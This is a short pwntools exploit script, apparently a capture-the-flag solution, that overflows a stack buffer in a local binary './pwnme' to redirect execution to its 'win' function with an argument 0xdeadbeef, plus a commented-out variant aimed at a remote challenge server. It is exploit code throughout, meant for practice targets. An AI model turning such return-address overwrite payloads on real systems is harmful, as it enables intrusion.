#!/usr/bin/python3

from pwn import *

e = ELF('./pwnme')
offset = 36

return_address = e.symbols['win']

payload = offset * b'A'
payload += p32(return_address)
payload += p32(0x0)
payload += p32(0xdeadbeef)

p = process('./pwnme')
p.sendline(payload)
p.interactive()
'''
conn = remote('0.cloud.chals.io',28949)
conn.sendline(payload)
conn.interactive()
'''
